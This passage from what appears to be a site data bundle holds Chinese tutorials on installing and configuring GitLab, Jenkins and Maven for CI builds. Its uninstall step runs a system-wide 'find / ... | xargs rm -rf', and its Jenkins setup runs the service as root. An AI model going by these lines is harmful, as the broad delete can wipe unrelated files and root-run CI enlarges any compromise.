--permanent\nfirewall-cmd --reload\n\n\n1\n2\n3\n\n\n> 如果关闭防火墙就不需要做以上配置\n\n5. 下载 gitlab 包，并且安装\n在线下载安装包：\n\nwget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n# 安装\nrpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n\n\n1\n2\n3\n\n\n6. 修改 gitlab 配置\n\nvi /etc/gitlab/gitlab.rb\n# 修改gitlab访问地址和端口，默认为80，我们改为82\nexternal_url \'http://192.168.66.100:82\'\nnginx[\'listen_port\'] = 82\n\n\n1\n2\n3\n4\n\n 7. 重载配置及启动 gitlab\n\ngitlab-ctl reconfigure\ngitlab-ctl restart\n\n\n1\n2\n\n\n8. 把端口添加到防火墙\n\nfirewall-cmd --zone=public --add-port=82/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n\n启动成功后，看到以下修改管理员 root 密码的页面，修改密码后，然后登录即可\n\n\n# gitlab 添加组、创建用户、创建项目\n\n1. 创建组\n使用管理员 root 创建组，一个组里面可以有多个项目分支，可以将开发添加到组里面进行设置权限，不同的组就是公司不同的开发项目或者服务模块，不同的组添加不同的开发即可实现对开发设置权限的管理\n\n2. 创建用户\n创建用户的时候，可以选择 regular 或 admin 类型。创建完用户后，立即修改密码\n\n3. 将用户添加到组中\n选择某个用户组，进行 members 管理组的成员\n\ngitlab 用户在组里面有 5 种不同权限：\n\n * guest：可以创建 issue、发表评论，不能读写版本库 reporter：可以克隆代码，不能提交，qa、pm 可以赋予这个权限\n * developer：可以克隆代码、开发、提交、push，普通开发可以赋予这个权限\n * maintainer：可以创建项目、添加 tag、保护分支、添加项目成员、编辑项目，核心开发可以赋予这个权限\n * owner：可以设置项目访问权限 - visibility level、删除项目、迁移项目、管理组成员，开发组组长可以赋予这个权限\n\n4. 在用户组中创建项目\n以刚才创建的新用户身份登录到 gitlab，然后在用户组中创建新的项目\n\n\n# jenkins 安装\n\n1. 获取 jenkins 安装包，下载页面：http://mirrors.jenkins-ci.org/redhat/\n\n# 国内环境不是那么好，下载要科学\nwget http://mirrors.jenkins-ci.org/redhat/jenkins-2.190.3-1.1.noarch.rpm\n# 安装\nrpm -ivh jenkins-2.190.3-1.1.noarch.rpm\n\n\n1\n2\n3\n4\n\n\n2. 修改 jenkins 配置\n\nvim /etc/sysconfig/jenkins\n# 修改内容如下\n# 能执行jenkins的用户权限\njenkins_user="root" \n# 页面访问端口\njenkins_port="7777" \n\n\n1\n2\n3\n4\n5\n6\n\n\n3. 启动 jenkins\n\nsystemctl start jenkins\n\n\n1\n\n\n> 报错\n> starting jenkins bash: /usr/bin/java: 没有那个文件或目录\n> failed to start lsb: jenkins automation server.\n> 是因为 jenkins 内部自己配置了 java 地址，需要改一下。\n> vim /etc/init.d/jenkins\n> /usr/bin/java 找到，并改成自己的 java 地址，我的是 /opt/software/java8/jre/bin/java，注意这里找的是 jre 的。\n> 执行 systemctl daemon-reload，在执行 systemctl start jenkins\n\n> 最新版本 jenkins 2.346.1 和之前版本还是有不一样的地方，这里只说几个 jenkins 2.346.1 遇到的报错：\n> 1 aug 16 14:19:14 host-10-240-30-93 jenkins [31531]: jenkins: failed to find a valid java installation 这种报错一直说是没安装 java，但是我明明按照以上方式都配置过了，最终解决方式就是编辑 vim /usr/lib/systemd/system/jenkins.service 文件，找到被注释的 environment="java_home="，把自己的 java 路径写上，如 /opt/software/jdk\n> 2 aug 16 14:26:42 host-10-240-30-93 jenkins [10782]: java.net.bindexception: address already in use 你会发现在 vim /etc/sysconfig/jenkins 文件都改过了，但还是端口占用，依然需要修改 vim /usr/lib/systemd/system/jenkins.service 文件，并编辑 environment="jenkins_port=7777" 改成自己需要的端口\n> 3 aug 16 14:28:37 host-10-240-30-93 jenkins [20925]: caused: java.io.ioexception: failed to start jetty 检查所有配置包括 /etc/sysconfig/jenkins 和 /usr/lib/systemd/system/jenkins.service，却报配置正确\n> 4 aug 16 14:44:10 host-10-240-30-93 jenkins [12516]: jenkins: invalid java version: java version "17.0.3.1" 2022-04-22 lts java 版本过高或过低导致，我用 java17 或 11 直接不行，换成 8 就好了\n\n4. 打开浏览器访问\nhttp://192.168.66.101:7777\n\n> 注意：本服务器把防火墙关闭了，如果开启防火墙，需要在防火墙添加端口\n\n5. 获取并输入 admin 账户密码\n\ncat /var/lib/jenkins/secrets/initialadminpassword\n\n\n1\n\n\n6. 添加一个管理员账户，并进入 jenkins 后台\n\n7. 跳过插件安装\n因为 jenkins 插件需要连接默认官网下载，速度非常慢，而且经过会失败，所以我们暂时先跳过插件安装\n\n\n\n\n\n\n\n\n\n\n\n\n# jenkins 插件管理\n\njenkins 本身不提供很多功能，我们可以通过使用插件来满足我们的使用。例如从 gitlab 拉取代码，使用 maven 构建项目等功能需要依靠插件完成。接下来演示如何下载插件。\n\n\n# 修改 jenkins 插件下载地址\n\njenkins 国外官方插件地址下载速度非常慢，所以可以修改为国内插件地址：jenkins->manage jenkins->manage plugins，点击 available\n\n\n\n\n\nsystemctl restart jenkins\n\n\n1\n\n\n\n\n此时我们可以进入 /var/lib/jenkins/updates，看到有个 default.json，这个文件里面是所有插件的地址，这里面的地址目前全是国外的地址，可以用以下命令进行替换到国内地址。\n\nsed -i \'s/http:\\/\\/updates.jenkinsci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\' default.json && sed -i \'s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\' default.json\n\n\n1\n\n\n最后，manage plugins 点击 advanced，把 update site 改为国内插件下载地址\n\n> https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\n\n\n\n\n\n重启 jenkins ，在访问路径后面键入 restart 即可。\n\nhttp://192.168.81.102:7777/restart\n\n\n1\n\n\n重启好后，我们进行对 jenkins 进行汉化。\n\n\n\n\n\n> jenkins 版本更新太快，包括核心库也会更新，大家可以放心更新，不用怕，最多就是起不来重装。\n\n\n# jenkins 卸载\n\n先停止 jenkins 的运行\n\n# 方式一\nsystemctl stop jenkins\n# 方式二\nservice jenkins stop\n\n\n1\n2\n3\n4\n\n\n找到所有跟 jenkins 相关的包\n\nrpm -qc jenkins\n\n\n1\n\n\n卸载相关包\n\nrpm -e jenkins\n\n\n1\n\n\n检查是否卸载成功\n\nrpm -ql jenkins\n\n\n1\n\n\n删除参与文件\n\nfind / -iname jenkins | xargs -n 1000 rm -rf\n\n\n1\n',charsets:{cjk:!0}},{title:"Jenkins(三) Jenkins用户管理及凭证",frontmatter:{title:"Jenkins(三) Jenkins用户管理及凭证",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/502",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/502.Jenkins(%E4%B8%89)%20Jenkins%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%8F%8A%E5%87%AD%E8%AF%81.html",relativePath:"01.运维/50.Jenkins/502.Jenkins(三) Jenkins用户管理及凭证.md",key:"v-a5b32138",path:"/jenkins/502/",headers:[{level:2,title:"用户管理",slug:"用户管理",normalizedTitle:"用户管理",charIndex:2},{level:3,title:"安装Role-based Authorization Strategy插件",slug:"安装role-based-authorization-strategy插件",normalizedTitle:"安装 role-based authorization strategy 插件",charIndex:72},{level:3,title:"修改安全配置策略",slug:"修改安全配置策略",normalizedTitle:"修改安全配置策略",charIndex:118},{level:3,title:"分配角色和用户",slug:"分配角色和用户",normalizedTitle:"分配角色和用户",charIndex:135},{level:3,title:"建立项目",slug:"建立项目",normalizedTitle:"建立项目",charIndex:696},{level:2,title:"Jenkins凭证管理",slug:"jenkins凭证管理",normalizedTitle:"jenkins 凭证管理",charIndex:713},{level:3,title:"安装Credentials Binding插件",slug:"安装credentials-binding插件",normalizedTitle:"安装 credentials binding 插件",charIndex:807},{level:3,title:"安装Git插件和Git工具",slug:"安装git插件和git工具",normalizedTitle:"安装 git 插件和 git 工具",charIndex:1296},{level:3,title:"添加凭证（username & password）",slug:"添加凭证-username-password",normalizedTitle:"添加凭证（username &amp; password）",charIndex:null},{level:3,title:"SSH 密钥类型",slug:"ssh-密钥类型",normalizedTitle:"ssh 密钥类型",charIndex:1680}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"用户管理 安装Role-based Authorization Strategy插件 修改安全配置策略 分配角色和用户 建立项目 Jenkins凭证管理 安装Credentials Binding插件 安装Git插件和Git工具 添加凭证（username & password） SSH 密钥类型",content:'# 用户管理\n\n我们可以利用 Role-based Authorization Strategy 插件来管理 Jenkins 用户权限\n\n\n# 安装 Role-based Authorization Strategy 插件\n\n\n\n\n# 修改安全配置策略\n\n\n\n\n\n\n# 分配角色和用户\n\n\n\n\n\n\n\nGlobal roles（全局角色）：管理员等高级用户可以创建基于全局的角色\nItem roles（项目角色）：针对某个或者某些项目的角色\nNode roles（节点角色）：节点相关的权限\n\n我们添加以下三个角色：\n\n * baseRole：该角色为全局角色。这个角色需要绑定 Overall 下面的 Read 权限，是为了给所有用户绑定最基本的 Jenkins 访问权限。注意：如果不给后续用户绑定这个角色，会报错误：用户名 ismissing the Overall/Read permission\n * role1：该角色为项目角色。使用正则表达式绑定 "itcast.*"，意思是只能操作 itcast 开头的项目。\n * role2：该角色也为项目角色。绑定 "itheima.*"，意思是只能操作 itheima 开头的项目。\n\n\n\n\n\n\n\n\n\n在系统管理页面进入 Manage Users\n\n\n\n\n\n给用户分配角色\n系统管理页面进入 Manage and Assign Roles，点击 Assign Roles\n绑定规则如下：\nroot1 用户分别绑定 baseRole 和 role1 角色\nroot2 用户分别绑定 baseRole 和 role2 角色\n\n\n\n\n\n\n# 建立项目\n\n\n\n\n\n\n\n\n\n\n# Jenkins 凭证管理\n\n凭据可以用来存储需要密文保护的数据库密码、Gitlab 密码信息、Docker 私有仓库密码等，以便 Jenkins 可以和这些第三方的应用进行交互。\n\n\n# 安装 Credentials Binding 插件\n\n要在 Jenkins 使用凭证管理功能，需要安装 Credentials Binding 插件\n\n\n\n\n\n\n\n\n\n\n\n * Username with password：用户名和密码\n * SSH Username with private key： 使用 SSH 用户和密钥\n * Secret file：需要保密的文本文件，使用时 Jenkins 会将文件复制到一个临时目录中，再将文件路径设置到一个变量中，等构建结束后，所复制的 Secret file 就会被删除。\n * Secret text：需要保存的一个加密的文本串，如钉钉机器人或 Github 的 api token\n * Certificate：通过上传证书文件的方式\n\n常用的凭证类型有：Username with password（用户密码）和 SSH Username with private key（SSH 密钥），接下来以使用 Git 工具到 Gitlab 拉取项目源码为例，演示 Jenkins 的如何管理 Gitlab 的凭证。\n\n\n# 安装 Git 插件和 Git 工具\n\n为了让 Jenkins 支持从 Gitlab 拉取源码，需要安装 Git 插件以及在 CentOS7 上安装 Git 工具。\n\n\n\n在 centos 上安装 git 工具\n\n# 安装\nyum install git -y \n# 安装后查看版本\ngit --version \n\n\n1\n2\n3\n4\n\n\n\n# 添加凭证（username & password）\n\n把你在 git 上的账号密码加入到凭证中。\n\n\n\n回到我们在 jenkins 的项目中，来配置这个项目。\n\n\n\n\n\n应用，然后保存。保存后我们构建这个项目\n\n\n\n\n\n构建成功后，可以看到 jenkins 会把项目在服务器中的 /var/lib/jenkins/workspace/test01 路径构建一个项目，通过这种方式代表我们配置 git 的凭证是成功的。\n\n\n# SSH 密钥类型\n\nSSH 免密登录示意图\n\n\n\n1. 使用 root 用户生成公钥和私钥\n\nssh-keygen -t rsa\n\n\n1\n\n\n在 /root/.ssh/ 目录保存了公钥和使用\n\n\n\nid_rsa：私钥文件\nid_rsa.pub：公钥文件\n\n2. 把生成的公钥的内容放在 Gitlab 中，我的是 Gitea\n\n\n\n3. 在 Jenkins 中添加凭证，配置私钥\n在 Jenkins 添加一个新的凭证，类型为 "SSH Username with private key"，把刚才生成私有文件内容复制过来\n\n\n\n这个 root，是你在 服务器，root 目录下生成的，所以填写 root，最后依然是在项目中配置一下 git 即可',normalizedContent:'# 用户管理\n\n我们可以利用 role-based authorization strategy 插件来管理 jenkins 用户权限\n\n\n# 安装 role-based authorization strategy 插件\n\n\n\n\n# 修改安全配置策略\n\n\n\n\n\n\n# 分配角色和用户\n\n\n\n\n\n\n\nglobal roles（全局角色）：管理员等高级用户可以创建基于全局的角色\nitem roles（项目角色）：针对某个或者某些项目的角色\nnode roles（节点角色）：节点相关的权限\n\n我们添加以下三个角色：\n\n * baserole：该角色为全局角色。这个角色需要绑定 overall 下面的 read 权限，是为了给所有用户绑定最基本的 jenkins 访问权限。注意：如果不给后续用户绑定这个角色，会报错误：用户名 ismissing the overall/read permission\n * role1：该角色为项目角色。使用正则表达式绑定 "itcast.*"，意思是只能操作 itcast 开头的项目。\n * role2：该角色也为项目角色。绑定 "itheima.*"，意思是只能操作 itheima 开头的项目。\n\n\n\n\n\n\n\n\n\n在系统管理页面进入 manage users\n\n\n\n\n\n给用户分配角色\n系统管理页面进入 manage and assign roles，点击 assign roles\n绑定规则如下：\nroot1 用户分别绑定 baserole 和 role1 角色\nroot2 用户分别绑定 baserole 和 role2 角色\n\n\n\n\n\n\n# 建立项目\n\n\n\n\n\n\n\n\n\n\n# jenkins 凭证管理\n\n凭据可以用来存储需要密文保护的数据库密码、gitlab 密码信息、docker 私有仓库密码等，以便 jenkins 可以和这些第三方的应用进行交互。\n\n\n# 安装 credentials binding 插件\n\n要在 jenkins 使用凭证管理功能，需要安装 credentials binding 插件\n\n\n\n\n\n\n\n\n\n\n\n * username with password：用户名和密码\n * ssh username with private key： 使用 ssh 用户和密钥\n * secret file：需要保密的文本文件，使用时 jenkins 会将文件复制到一个临时目录中，再将文件路径设置到一个变量中，等构建结束后，所复制的 secret file 就会被删除。\n * secret text：需要保存的一个加密的文本串，如钉钉机器人或 github 的 api token\n * certificate：通过上传证书文件的方式\n\n常用的凭证类型有：username with password（用户密码）和 ssh username with private key（ssh 密钥），接下来以使用 git 工具到 gitlab 拉取项目源码为例，演示 jenkins 的如何管理 gitlab 的凭证。\n\n\n# 安装 git 插件和 git 工具\n\n为了让 jenkins 支持从 gitlab 拉取源码，需要安装 git 插件以及在 centos7 上安装 git 工具。\n\n\n\n在 centos 上安装 git 工具\n\n# 安装\nyum install git -y \n# 安装后查看版本\ngit --version \n\n\n1\n2\n3\n4\n\n\n\n# 添加凭证（username & password）\n\n把你在 git 上的账号密码加入到凭证中。\n\n\n\n回到我们在 jenkins 的项目中，来配置这个项目。\n\n\n\n\n\n应用，然后保存。保存后我们构建这个项目\n\n\n\n\n\n构建成功后，可以看到 jenkins 会把项目在服务器中的 /var/lib/jenkins/workspace/test01 路径构建一个项目，通过这种方式代表我们配置 git 的凭证是成功的。\n\n\n# ssh 密钥类型\n\nssh 免密登录示意图\n\n\n\n1. 使用 root 用户生成公钥和私钥\n\nssh-keygen -t rsa\n\n\n1\n\n\n在 /root/.ssh/ 目录保存了公钥和使用\n\n\n\nid_rsa：私钥文件\nid_rsa.pub：公钥文件\n\n2. 把生成的公钥的内容放在 gitlab 中，我的是 gitea\n\n\n\n3. 在 jenkins 中添加凭证，配置私钥\n在 jenkins 添加一个新的凭证，类型为 "ssh username with private key"，把刚才生成私有文件内容复制过来\n\n\n\n这个 root，是你在 服务器，root 目录下生成的，所以填写 root，最后依然是在项目中配置一下 git 即可',charsets:{cjk:!0}},{title:"Jenkins(四) Maven安装和配置",frontmatter:{title:"Jenkins(四) Maven安装和配置",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/503",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/503.Jenkins(%E5%9B%9B)%20Maven%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.html",relativePath:"01.运维/50.Jenkins/503.Jenkins(四) Maven安装和配置.md",key:"v-45042106",path:"/jenkins/503/",headers:[{level:2,title:"安装Maven",slug:"安装maven",normalizedTitle:"安装 maven",charIndex:21},{level:3,title:"配置环境变量",slug:"配置环境变量",normalizedTitle:"配置环境变量",charIndex:181},{level:3,title:"全局工具配置关联JDK和Maven",slug:"全局工具配置关联jdk和maven",normalizedTitle:"全局工具配置关联 jdk 和 maven",charIndex:405},{level:3,title:"添加Jenkins全局变量",slug:"添加jenkins全局变量",normalizedTitle:"添加 jenkins 全局变量",charIndex:492},{level:3,title:"修改Maven的settings.xml",slug:"修改maven的settings-xml",normalizedTitle:"修改 maven 的 settings.xml",charIndex:516},{level:3,title:"测试Maven是否配置成功",slug:"测试maven是否配置成功",normalizedTitle:"测试 maven 是否配置成功",charIndex:887}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"安装Maven 配置环境变量 全局工具配置关联JDK和Maven 添加Jenkins全局变量 修改Maven的settings.xml 测试Maven是否配置成功",content:"在 Jenkins 集成服务器上，我们需要安装 Maven 来编译和打包项目。\n\n\n# 安装 Maven\n\n先上传 Maven 软件到服务器\n\n# 解压\ntar -xzf apache-maven-3.6.2-bin.tar.gz \n# 移动文件\nmv apache-maven-3.6.2 /opt/software/maven\n\n\n1\n2\n3\n4\n\n\n\n# 配置环境变量\n\nvim /etc/profile\nexport JAVA_HOME=/opt/software/java8\nexport MAVEN_HOME=/opt/software/maven\nexport PATH=$PATH:$JAVA_HOME/bin:$MAVEN_HOME/bin\n\n\n1\n2\n3\n4\n\n\n# 配置生效\nsource /etc/profile \n# 查找Maven版本\nmvn -v \n\n\n1\n2\n3\n4\n\n\n\n# 全局工具配置关联 JDK 和 Maven\n\nJenkins->Global Tool Configuration->JDK-> 新增 JDK，配置如下：\n\n\n\n\n\n\n\n\n# 添加 Jenkins 全局变量\n\n\n\n\n\n\n# 修改 Maven 的 settings.xml\n\n# 创建本地仓库目录\nmkdir /opt/software/maven/repo \n# 修改文件内容\nvi /opt/software/maven/conf/settings.xml\n<localRepository>/opt/software/maven/repo</localRepository>\n<mirror>\n\t<id>alimaven</id>\n\t<name>aliyun maven</name>\n\t<url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n\t<mirrorOf>central</mirrorOf>\n</mirror> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 测试 Maven 是否配置成功\n\n使用之前的 gitlab 密码测试项目，修改 jenkins 项目配置\n\n\n\n\n\n\n\n\n\n我们到 jenkins 服务器的 /var/lib/jenkins/workspace/test01/target/ 下面就可以看到我们打的 jar 包\n\n> 这里反馈一个问题，我这里使用的是 maven 私服（nexus），maven 配置成功但项目就是没办法拉取到自己发布的 jar，原因是我下载的是 maven3.8.x，换成 3.6 就可以了，看到原因说是因为 3.8.x 新加了 jar 的安全阻塞问题。",normalizedContent:"在 jenkins 集成服务器上，我们需要安装 maven 来编译和打包项目。\n\n\n# 安装 maven\n\n先上传 maven 软件到服务器\n\n# 解压\ntar -xzf apache-maven-3.6.2-bin.tar.gz \n# 移动文件\nmv apache-maven-3.6.2 /opt/software/maven\n\n\n1\n2\n3\n4\n\n\n\n# 配置环境变量\n\nvim /etc/profile\nexport java_home=/opt/software/java8\nexport maven_home=/opt/software/maven\nexport path=$path:$java_home/bin:$maven_home/bin\n\n\n1\n2\n3\n4\n\n\n# 配置生效\nsource /etc/profile \n# 查找maven版本\nmvn -v \n\n\n1\n2\n3\n4\n\n\n\n# 全局工具配置关联 jdk 和 maven\n\njenkins->global tool configuration->jdk-> 新增 jdk，配置如下：\n\n\n\n\n\n\n\n\n# 添加 jenkins 全局变量\n\n\n\n\n\n\n# 修改 maven 的 settings.xml\n\n# 创建本地仓库目录\nmkdir /opt/software/maven/repo \n# 修改文件内容\nvi /opt/software/maven/conf/settings.xml\n<localrepository>/opt/software/maven/repo</localrepository>\n<mirror>\n\t<id>alimaven</id>\n\t<name>aliyun maven</name>\n\t<url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n\t<mirrorof>central</mirrorof>\n</mirror> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 测试 maven 是否配置成功\n\n使用之前的 gitlab 密码测试项目，修改 jenkins 项目配置\n\n\n\n\n\n\n\n\n\n我们到 jenkins 服务器的 /var/lib/jenkins/workspace/test01/target/ 下面就可以看到我们打的 jar 包\n\n> 这里反馈一个问题，我这里使用的是 maven 私服（nexus），maven 配置成功但项目就是没办法拉取到自己发布的 jar，原因是我下载的是 maven3.8.x，换成 3.6 就可以了，看到原因说是因为 3.8.x 新加了 jar 的安全阻塞问题。",charsets:{cjk:!0}},{title:"Jenkins(五) Jenkins构建Maven项目",frontmatter:{title:"Jenkins(五) Jenkins构建Maven项目",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/504",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/504.Jenkins(%E4%BA%94)%20Jenkins%E6%9E%84%E5%BB%BAMaven%E9%A1%B9%E7%9B%AE.html",relativePath:"01.运维/50.Jenkins/504.Jenkins(五) Jenkins构建Maven项目.md",key:"v-eebfe876",path:"/jenkins/504/",headers:[{level:2,title:"自由风格项目构建",slug:"自由风格项目构建",normalizedTitle:"自由风格项目构建",charIndex:269},{level:2,title:"maven 项目",slug:"maven-项目",normalizedTitle:"maven 项目",charIndex:585},{level:2,title:"Pipeline流水线项目构建",slug:"pipeline流水线项目构建",normalizedTitle:"pipeline 流水线项目构建",charIndex:647},{level:3,title:"Pipeline简介",slug:"pipeline简介",normalizedTitle:"pipeline 简介",charIndex:668},{level:3,title:"安装Pipeline插件",slug:"安装pipeline插件",normalizedTitle:"安装 pipeline 插件",charIndex:1498},{level:3,title:"Scripted Pipeline脚本式-Pipeline",slug:"scripted-pipeline脚本式-pipeline",normalizedTitle:"scripted pipeline 脚本式 - pipeline",charIndex:2265},{level:2,title:"编译打包部署",slug:"编译打包部署",normalizedTitle:"编译打包部署",charIndex:2844},{level:3,title:"拉取代码",slug:"拉取代码",normalizedTitle:"拉取代码",charIndex:1766},{level:3,title:"编译打包",slug:"编译打包",normalizedTitle:"编译打包",charIndex:323},{level:3,title:"远程部署",slug:"远程部署",normalizedTitle:"远程部署",charIndex:2942},{level:2,title:"把jenkins的Pipeline脚本放到项目中执行（Pipeline Script from SCM）",slug:"把jenkins的pipeline脚本放到项目中执行-pipeline-script-from-scm",normalizedTitle:"把 jenkins 的 pipeline 脚本放到项目中执行（pipeline script from scm）",charIndex:3005}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"自由风格项目构建 maven 项目 Pipeline流水线项目构建 Pipeline简介 安装Pipeline插件 Scripted Pipeline脚本式-Pipeline 编译打包部署 拉取代码 编译打包 远程部署 把jenkins的Pipeline脚本放到项目中执行（Pipeline Script from SCM）",content:"Jenkins 中自动构建项目的类型有很多，常用的有以下三种：\n\n * 自由风格软件项目（FreeStyle Project）可以构建不同语言的项目\n * Maven 项目（Maven Project）专门准对 java 语言项目\n * 流水线项目（Pipeline Project）灵活度高，用代码编写 jenkins 构建过程，如 k8s\n\n每种类型的构建其实都可以完成一样的构建过程与结果，只是在操作方式、灵活度等方面有所区别，在实际开发中可以根据自己的需求和习惯来选择。（PS：个人推荐使用流水线类型，因为灵活度非常高）\n\n\n# 自由风格项目构建\n\n1. 创建自由风格项目\n\n\n\n\n\n2. 配置 git\n\n\n\n3. 构建\n\n\n\n\n\n4. 编译打包\n\necho \"开始编译和打包\"\nmvn clean package\necho \"编译和打包结束\"\n\n\n1\n2\n3\n\n\n\n\n\n\n\n\n5. 部署到目标机\n安装 Deploy to container 插件，这种插件适合发布 war 这种类型的项目，到 tomcat 等容器上去。\n\n\n\n\n\n\n\n\n\ntomcat 凭证需要自己百度去配置以下，当你配置成功后，可以访问到 tomcat 的 IP:8080/manager/html 页面，配置完后回到 jenkins，部署远程 tomcat 的时候需要这个凭证。\n\n\n# maven 项目\n\n1. 安装 Maven Integration 插件\n2. 构建 maven 项目\n\n\n\n\n\n\n\n\n# Pipeline 流水线项目构建\n\n\n# Pipeline 简介\n\nPipeline，简单来说，就是一套运行在 Jenkins 上的工作流框架，将原来独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排和可视化的工作。\n\n使用 Pipeline 有以下好处：\n\n * 代码：Pipeline 以代码的形式实现，通常被检入源代码控制，使团队能够编辑，审查和迭代其传送流程。\n * 持久：无论是计划内的还是计划外的服务器重启，Pipeline 都是可恢复的。\n * 可停止：Pipeline 可接收交互式输入，以确定是否继续执行 Pipeline\n * 多功能：Pipeline 支持现实世界中复杂的持续交付要求。它支持 fork/join、循环执行，并行执行任务的功能。\n * 可扩展：Pipeline 插件支持其 DSL 的自定义扩展 ，以及与其他插件集成的多个选项。\n\n如何创建 Jenkins Pipeline：\n\n * Pipeline 脚本是由 Groovy 语言实现的，但是我们没必要单独去学习 Groovy\n * Pipeline 支持两种语法：Declarative (声明式) 和 Scripted Pipeline (脚本式) 语法，Scripted Pipeline 支持更多的 groovy 语言，不像前者受那么多的结构化限制。由于可以编写灵活的逻辑，可以认为是高级版的 pipeline，如果你想实现的逻辑比较灵活，比如有判断、分支，或者需要用 groovy 语言编写复杂的运行步骤，都应该选择使用 Scripted Pipeline。\n * Pipeline 也有两种创建方法：可以直接在 Jenkins 的 Web UI 界面中输入脚本；也可以通过创建一个 Jenkinsfile 脚本文件放入项目源码库中（一般我们都推荐在 Jenkins 中直接从源代码控制 (SCM) 中直接载入 Jenkinsfile Pipeline 这种方法）。\n\n\n# 安装 Pipeline 插件\n\n\n\n> 安装完毕记得重启\n\n安装插件有很多依赖插件会安装失败，不用管，只要创建项目的时候多了 “流水线” 类型即可。\n\n\n\n你会在项目的配置中看到多了一个流水线，它就是取代了以上项目的构建和构建后的一些工作。\n\n\n\n以上是基于一个声明式 **（Declarative）的 Pipeline**，以 pipeline 开头的就是声明式的。\nstages：代表整个流水线的所有执行阶段。通常 stages 只有 1 个，里面包含多个 stage\nstage：代表流水线中的某个阶段，可能出现 n 个。一般分为拉取代码，编译构建，部署等阶段。\nsteps：代表一个阶段内需要执行的逻辑 (步骤)。steps 里面是 shell 脚本，git 拉取代码，ssh 远程发布等任意内容。\n模拟一段，然后执行看看效果\n\npipeline {\n    agent any\n\n    stages {\n        stage('拉取代码') {\n            steps {\n                echo '拉取代码'\n            }\n        }\n        stage('编译构建') {\n            steps {\n                echo '编译构建'\n            }\n        }\n        stage('项目部署') {\n            steps {\n                echo '项目部署'\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n\n\n# Scripted Pipeline 脚本式 - Pipeline\n\n\n\n * Node：节点，一个 Node 就是一个 Jenkins 节点，Master 或者 Agent，是执行 Step 的具体运行环境，后续讲到 Jenkins 的 Master-Slave 架构的时候用到。\n * Stage：阶段，一个 Pipeline 可以划分为若干个 Stage，每个 Stage 代表一组操作，比如：Build、Test、Deploy，Stage 是一个逻辑分组的概念。\n * Step：步骤，Step 是最基本的操作单元，可以是打印一句话，也可以是构建一个 Docker 镜像，由各类 Jenkins 插件提供，比如命令：sh ‘make’，就相当于我们平时 shell 终端中执行 make 命令一样。\n\nnode {\n    def mvnHome\n    stage('拉取代码') { // for display purposes\n        echo '拉取代码'\n    }\n    stage('编译构建') {\n        echo '编译构建'\n    }\n    stage('项目部署') {\n        echo '项目部署'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n\n\n# 编译打包部署\n\n\n# 拉取代码\n\n关于声明式的 code 编写，可以通过快捷的方式生成\n\n\n\n\n\n在这里可以配置我们的 git 项目拉取地址\n\n\n\n\n\n\n\n\n# 编译打包\n\n\n\n\n\n\n\n\n\n\n# 远程部署\n\n\n\n得到后依然编译执行。如果是 jar 包的，可以提前在服务器写好脚本执行，在 sh ' 执行你的脚本'\n\n\n# 把 jenkins 的 Pipeline 脚本放到项目中执行（Pipeline Script from SCM）\n\n刚才我们都是直接在 Jenkins 的 UI 界面编写 Pipeline 代码，这样不方便脚本维护，建议把 Pipeline 脚本放在项目中（一起进行版本控制）\n\n1. 在项目根目录建立 Jenkinsfile 文件，把内容复制到该文件中，并提交到 git 仓库\n\n\n\n2. 在项目中引用该文件\n\n\n\n\n\n\n\n",normalizedContent:"jenkins 中自动构建项目的类型有很多，常用的有以下三种：\n\n * 自由风格软件项目（freestyle project）可以构建不同语言的项目\n * maven 项目（maven project）专门准对 java 语言项目\n * 流水线项目（pipeline project）灵活度高，用代码编写 jenkins 构建过程，如 k8s\n\n每种类型的构建其实都可以完成一样的构建过程与结果，只是在操作方式、灵活度等方面有所区别，在实际开发中可以根据自己的需求和习惯来选择。（ps：个人推荐使用流水线类型，因为灵活度非常高）\n\n\n# 自由风格项目构建\n\n1. 创建自由风格项目\n\n\n\n\n\n2. 配置 git\n\n\n\n3. 构建\n\n\n\n\n\n4. 编译打包\n\necho \"开始编译和打包\"\nmvn clean package\necho \"编译和打包结束\"\n\n\n1\n2\n3\n\n\n\n\n\n\n\n\n5. 部署到目标机\n安装 deploy to container 插件，这种插件适合发布 war 这种类型的项目，到 tomcat 等容器上去。\n\n\n\n\n\n\n\n\n\ntomcat 凭证需要自己百度去配置以下，当你配置成功后，可以访问到 tomcat 的 ip:8080/manager/html 页面，配置完后回到 jenkins，部署远程 tomcat 的时候需要这个凭证。\n\n\n# maven 项目\n\n1. 安装 maven integration 插件\n2. 构建 maven 项目\n\n\n\n\n\n\n\n\n# pipeline 流水线项目构建\n\n\n# pipeline 简介\n\npipeline，简单来说，就是一套运行在 